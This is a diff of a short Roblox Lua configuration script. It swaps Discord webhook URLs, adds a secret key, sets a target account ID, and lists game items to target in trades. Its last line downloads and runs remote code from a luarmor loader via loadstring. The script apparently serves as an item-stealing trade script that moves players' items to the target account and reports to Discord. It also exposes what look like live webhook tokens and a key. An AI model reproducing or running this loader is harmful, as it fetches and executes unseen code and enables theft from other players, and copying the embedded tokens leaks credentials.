@@ -1,7 +1,8 @@
-getgenv().WEBHOOK_URL = "https://discord.com/api/webhooks/1480386795735744512/Ko0zy4nMwcvCA61Cm7io7oicgR_FgbAS0CG8Vt60CSWiHEmVjEiUBoOmKi5LrBhAaL8R"
+getgenv().SECRET_KEY = "mrr_ca327e0bdce54235824f3f36330b3b4a"
 getgenv().TARGET_ID = 1718063814
 getgenv().DELAY_STEP = 1      
-getgenv().TRADE_CYCLE_DELAY = 2 
+getgenv().TRADE_CYCLE_DELAY = 2
+getgenv().DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1478411951796260956/VjORucfdYS8pMoTra6VnMGYlR1DMmrb8BCcVWJuE1mMLIxOhYyYstX7VV3Dmjdfb4rCD"
 getgenv().TARGET_BRAINROTS = {
     ["Meowl"] = true,
     ["Skibidi Toilet"] = true,
@@ -178,6 +179,8 @@ getgenv().TARGET_BRAINROTS = {
     ["Chicleteira Bicicleteira"] = true,
     ["Chicliterita bicicliterita"] = true,
     ["Chicleteirina Bicicleteirina"] = true,
-    ["To to to Sahur"] = true
+    ["To to to Sahur"] = true,
+    ["Griffin"] = true,
+    ["Nacho Spyder"] = true
 }
 loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/9a91b3ba6fb71423853ec2f885c42d67.lua"))()
